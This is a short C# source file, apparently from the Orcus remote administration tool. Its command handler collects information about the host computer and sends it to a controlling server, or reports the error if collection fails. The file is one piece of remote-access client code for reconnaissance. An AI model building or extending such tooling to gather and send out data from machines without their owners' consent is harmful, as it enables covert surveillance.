using System;
using System.Text;
using Orcus.CommandManagement;
using Orcus.Plugins;
using Orcus.Shared.Connection;
using Orcus.Shared.NetSerializer;

namespace Orcus.Commands.ComputerInformation
{
    internal class ComputerInformation : Command
    {
        public override void ProcessCommand(byte[] parameter, IConnectionInfo connectionInfo)
        {
            Shared.Commands.ComputerInformation.ComputerInformation information;
            try
            {
                information = InformationCollector.GetInformation();
            }
            catch (Exception ex)
            {
                connectionInfo.CommandFailed(this, Encoding.UTF8.GetBytes(ex.Message));
                return;
            }

            var serializer = new Serializer(typeof (Shared.Commands.ComputerInformation.ComputerInformation));
            ((ConnectionInfo) connectionInfo).SendServerPackage(ServerPackageType.SetComputerInformation,
                serializer.Serialize(information), true);
        }

        protected override uint GetId()
        {
            return 4;
        }
    }
}